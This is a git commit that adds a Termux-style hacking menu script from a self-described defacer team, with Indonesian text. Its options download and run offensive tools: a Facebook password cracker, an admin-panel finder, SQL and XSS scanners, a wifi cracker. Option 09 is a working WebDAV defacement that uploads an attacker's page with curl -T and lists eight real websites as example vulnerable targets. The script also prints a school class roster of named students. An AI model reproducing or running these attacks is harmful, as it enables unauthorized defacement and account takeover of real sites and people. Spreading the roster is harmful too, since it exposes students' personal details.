b4f7c18c12a5098c42bbf6bdab7a5da81fd80143
Mr. Mpx7 Aril Al Farel <56549838+FriendsDefacerTeam@users.noreply.github.com>
2019-12-05 03:25:14 +0700

    Add files via upload

---
+++ TKJcyber.sh
@@ -0,0 +1,292 @@
+#!/bin/sh
+#Mod By Mr.Mpx7
+#Jangan exploit Nano Omm
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+clear
+echo $blue" _______________________________________________"
+echo $blue"|"$purple"AUTHOR : "$white"MUHAMMAD ABDILLAH"$blue"                    |"
+echo $blue"|"$purple"TEAM   : "$white"WE ARE FR13NDS"$blue"                       |"
+echo $blue"|"$purple"FORUM  : "$white"DARK WEB" $red"&" $white"DEEP WEB"$blue"                  |"
+echo $blue"|______________________________________________|"
+echo $cyan"  ["$yellow" Tools TKJcyberV2 "$cyan"]" $cyan"["$yellow"Jangan Recode Njenk"$cyan"]"
+echo $cyan"              ["$yellow"Capek Gua Buatnya"$cyan"]"
+echo $red"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $red"║"$white"  NO"$red"   ║║"$purple"      DAFTAR MENU TOOLS "$red"    ║║"$green"  ON"$red"  ║"
+echo $red"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $red"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $red"║"$white"  Aa"$red"   ║║"$blue"    ABOUT INFORMATION AUTHOR"$red"║║" $white" ON "$red" ║"
+echo $red"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $red"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $red"║"$white"  Bb"$red"   ║║"$blue"    ABOUT INFORMATION TOOLS"$red" ║║"$white"  ON"$red"  ║"
+echo $red"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  01"$cyan"   ║║"$yellow" HACK FACEBOOK "$white"     NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  02"$cyan"   ║║"$yellow" ADMIN PANEL   "$white"     NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  03"$cyan"   ║║"$yellow" INSTALL NMAP  "$white"     NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  04"$cyan"   ║║"$yellow" LITESCRIPT DEFACE"$white"  NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  05"$cyan"   ║║"$yellow" INSTALL SQLMAP"$white"     NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  06"$cyan"   ║║"$yellow" INSTALL SQLSCAN"$white"    NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  07"$cyan"   ║║"$yellow" Install XSStrike"$white"   NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  08"$cyan"   ║║"$yellow" Install InstaBot"$red"    ROOT"$cyan"   ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  09"$cyan"   ║║"$yellow" DEFACE WEBDAV "$white"     NO ROOT"$cyan" ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $cyan"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $cyan"║"$green"  10"$cyan"   ║║"$yellow" HACK WIFI-HACKER"$red"    ROOT"$cyan"   ║║"$green"  ON"$cyan"  ║"
+echo $cyan"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo ""
+echo $red"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $red"║"$yellow" BACK"$red"  ║║"$blue" KEMBALI KE PROGRAM"$yellow"     BACK"$red"║║"$green"  ON "$red" ║"
+echo $red"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $red"╔══════╗╔═════════════════════════════╗╔══════╗"
+echo $red"║"$yellow" EXIT"$red"  ║║"$blue"KELUAR DARI PROGRAM"$yellow"     EXIT"$red"║║"$green"  ON "$red" ║"
+echo $red"╚══════╝╚═════════════════════════════╝╚══════╝"
+echo $white"╭────["$purple"r00t"$red"@"$purple"linux:"$white"~]" $cyan" ~/system" $white
+read -p "╰────➲ " bro
+
+if [ $bro = Aa ] || [ $bro = aa ]
+then
+clear
+sleep 1
+echo $white"[]+++++++++++++++++++++++++++++++++++++++++[]"
+echo $blue"        ["     $cyan"ABOUT INFORMATION AUTHOR"       $blue"]"
+echo $white"[]+++++++++++++++++++++++++++++++++++++++++[]"
+echo
+echo $white"========================================"
+sleep 2
+echo $cyan"Nama    :"$white"Muhammad Abdillah"
+sleep 1
+echo $cyan"Kelas   :"$white"X T.K.J 2"
+sleep 1
+echo $cyan"Sekolah :"$white"SMK N 1 DOLOK MASIHUL"
+sleep 1
+echo $cyan"Wali Kelas :"$white"Buk Anita"
+sleep 1
+echo $cyan"Ketua Kelas :"$white"Muhammad Abdillah"
+sleep 1
+echo $cyan"Wakil Ketua Kelas :"$white"Hary Amsyah"
+sleep 1
+echo $cyan"Sekertaris kelas :"$white"Nanda Riyani"
+sleep 1
+echo $cyan"Bandahara Kelas :"$white"Lyra Sri Mandani"
+sleep 1
+echo $cyan"Angggota :"$white"Seluruh Warga Kelas X T.K.J 2"
+sleep 1
+echo $cyan"Nama-Nama Anggota :  "
+sleep 1
+echo
+echo $white"1. angga saputra"
+echo "2. ayu lestari"
+echo "3. ade arista"
+echo "4. halimahtusaqdiah"
+echo "5. Ridho carlei naibaho"
+echo "6. weril nainggolan"
+echo "7. Dio armanda"
+echo "8. Melisa Hardining"
+echo "9. melisa utabarat"
+echo "10. muhammad diki anugrah"
+echo "11. muhammad ziyan akbar"
+echo "12. muhammad asri koto"
+echo "13. Rinaldi"
+echo "14. parulina butar-butar"
+echo "15. Dera rafika"
+echo "16. nasta alessandro tambun"
+echo "17. pria dimas"
+echo "18. ToMI"
+echo "19. Riska sabila"
+echo "20. Ria anggraini"
+echo "21. Eva"
+echo "22. Johannes sijabat"
+echo "23. Endah puji asnita"
+echo "24. nur rahma dinda pane"
+echo "25. Nia Septiana rahma"
+echo "26. Lutviah andini"
+echo "28. winda purba"
+echo "29. joya"
+echo "30. sinta"
+echo "31. siska sirmamata"
+echo "32. Ignatia"
+echo $white"========================================"
+fi
+
+if [ $bro = Bb ] || [ $bro = b ]
+then
+clear
+echo $yellow"Assalamu'Alaikum"
+sleep 1
+echo $white"Tools Ini Saya Buat Bertujuan Untuk"
+sleep 1
+echo $white"Membuat Sekolah SMK N 1 Dolok Masihul Sekaligus "
+sleep 1
+echo $white"jurusan TEKNIK KOMPUTER DAN JARINGAN"
+sleep 1
+echo $white"Di Kenal Di Masyarakat Dan Juga Membawa"
+sleep 1
+echo $white"Nama Kelas X T.K.J 2 Menjadi Lebih"
+sleep 1
+echo $white"Baik Lagi"
+sleep 1
+echo $white"Thanks,,,,,"
+fi
+
+if [ $bro = 01 ] || [ $bro = 1 ]
+then
+clear
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clonehttps://github.com/Ha3MrX/facebook-cracker
+cd facebook-cracker
+chmod +x facebook.py
+python facebook.py
+fi
+
+if [ $bro = "02" ] || [ $bro = "2" ]
+then
+apt update && apt upgrade
+pkg install git
+pkg install python2
+git clone https://github.com/UltimateHackers/Breacher
+cd Breacher
+python2 breacher.py
+fi
+
+if [ $bro = "03" ] || [ $bro = "3" ]
+then
+apt update && apt upgrade
+apt install nmap -y
+fi
+
+if [ $bro = "04" ] || [ $bro = "4" ]
+then
+apt update
+apt upgrade -y
+apt install python2 -y
+apt install git -y
+git clone https://github.com/4L13199/LITESCRIPT
+ls
+cd LITESCRIPT
+ls
+python2 LITESCRIPT.py
+fi
+
+if [ $bro = "05" ] || [ $bro = "5" ]
+then
+apt update
+apt install python
+apt install python2
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+python2 sqlmap.py
+python2 sqlmap.py -h
+fi
+
+if [ $bro = "06" ] || [ $bro = "6" ]
+then
+pkg install php
+pkg install git
+git clone http://www.github.com/Cvar1984/sqlscan.git
+cd sqlscan
+chmod +x sqlscan.php
+php sqlscan.php
+fi
+
+if [ $bro = "07" ] || [ $bro = "7" ]
+then
+apt update
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/UltimateHackers/XSStrike
+cd XSStrike
+pip2 install -r requirements.txt
+python2 xsstrike
+fi
+
+if [ $bro = "08" ] || [ $bro = "8" ]
+then
+apt update && apt upgrade
+apt install python2 -y
+apt install git -y
+git clone https://github.com/instagrambot/instabot
+pip2 install -U instabot
+cd instabot
+cd examples
+cd Ultimate
+python2 ultimate.py
+fi
+
+if [ $bro = 09 ] || [ $bro = 9 ]
+then
+clear
+echo "\033[34;1m"
+figlet -f slant Mr.Mpx7
+echo "\033[37;1m"
+echo "Masukan Web target"
+echo $purple"Contoh Web Target vuln"
+echo "	http://bestilling.udir.no/"
+echo "	http://560560.ru/"
+echo "	http://myownemailer.com/"
+echo "	http://Zoocentral.co.za/"
+echo "	http://50-50-50.ru/"
+echo "	http://tirupurjobs.net/"
+echo "	http://Matrimony.co.za/"
+echo "	http://Bheh.co.za/"
+echo $cyan"Masukkan Web Target"
+read -p "[MrMpx7]>" target
+echo $yellow"Masukan Nama script kalian"
+echo $red"Contoh :"$green" /sdcard/index.html"
+read -p "[MrMpx7]>" script
+curl -T /storage/emulated/0/$script $target
+echo ""
+echo $blue"Selesai! Tod Cek di $target $script "
+fi
+
+if [ $bro = "10" ] || [ $bro = "10" ]
+then
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/esc0rtd3w/wifi-hacker
+cd wifi-hacker
+chmod +x wifi-hacker.sh
+./wifi-hacker.sh
+fi
+
+if [ $bro = "back" ] || [ $bro = "BACK" ]
+then
+sh tkj.sh
+fi
+
+if [ $bro = "back" ] || [ $bro = "BACK" ]
+then
+clear
+figlet -f slant 'sampai' | lolcat
+figlet -f slant 'Jumpa' | lolcat
+figlet -f slant 'Lagi' | lolcat
+figlet -f slant 'Bangsad' | lolcat
+fi
